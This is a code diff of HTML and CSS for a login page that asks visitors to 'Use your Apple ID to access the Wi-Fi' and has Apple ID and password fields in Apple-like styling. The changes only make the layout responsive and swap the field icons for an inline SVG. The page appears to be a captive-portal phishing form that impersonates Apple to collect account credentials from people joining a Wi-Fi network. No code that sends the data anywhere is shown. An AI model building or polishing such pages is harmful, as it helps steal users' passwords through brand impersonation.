@@ -42,7 +42,9 @@
         }
 
         form {
-            width: 500px;
+            width: 100%;
+max-width: 500px;
+            padding: 0 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -65,32 +67,28 @@
         }
 
         #appleid {
-            min-width: 350px;
+width: 100%;
+            max-width: 100%;
             padding: 20px;
+            box-sizing: border-box;
             border: .5px solid #d2d2d7;
             border-radius: 10px;
             border-bottom-left-radius: 0;
             border-bottom-right-radius: 0;
-            background-repeat: no-repeat;
-            background-position: calc(100% - 20px) center;
-            background-image: url('./input.svg');
             align-self: center;
-            background-size: 8%;
-        }
+            }
 
         #password {
-            min-width: 350px;
+width: 100%;
+            max-width: 100%;
             padding: 20px;
+            box-sizing: border-box;
             border: .5px solid #d2d2d7;
             border-radius: 10px;
             border-top-left-radius: 0;
             border-top-right-radius: 0;
-            background-repeat: no-repeat;
-            background-position: calc(100% - 20px) center;
-            background-image: url('./input.svg');
             align-self: center;
-            background-size: 8%;
-        }
+            }
 
         input #appleid {
             box-shadow: none;
@@ -98,6 +96,31 @@
             -moz-box-shadow: none;
             -webkit-box-shadow: none;
             border-color: transparent;
+        }
+
+        .input { width: 100%; }
+
+        #inputText > div {
+            position: relative;
+            width: 100%;
+        }
+
+        #appleid, #password {
+            padding-right: 40px; /* Make space for the icon */
+        }
+
+        #inputText > div::after {
+            content: '';
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            background-image: url('data:image/svg+xml;utf8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22%23d2d2d7%22%3E%3Cpath%20d%3D%22M12%202C6.48%202%202%206.48%202%2012s4.48%2010%2010%2010%2010-4.48%2010-10S17.52%202%2012%202zm1%2015h-2v-2h2v2zm0-4h-2V7h2v6z%22/%3E%3C/svg%3E');
+            background-repeat: no-repeat;
+            background-size: contain;
+            pointer-events: none; /* So the input can still be clicked underneath */
         }
 
         .input2 {
@@ -176,16 +199,7 @@
             cursor: pointer;
         }
 
-        @media screen and (max-width: 768px) {
-            form {
-                width: 80%;
-            }
 
-            #appleid,
-            #password {
-                min-width: 90%;
-            }
-        }
     </style>
 </head>
 
@@ -225,7 +239,7 @@
                 <h2>Sign in</h2>
                 <h2>Use your Apple ID to access the Wi-Fi</h2>
             </div>
-            <div class="input" id="inputText">
+            <div class="input" id="inputText" style="width: 100%;">
                 <div>
                     <input type="email" name="email" placeholder="Apple ID" id="appleid" required>
                 </div>
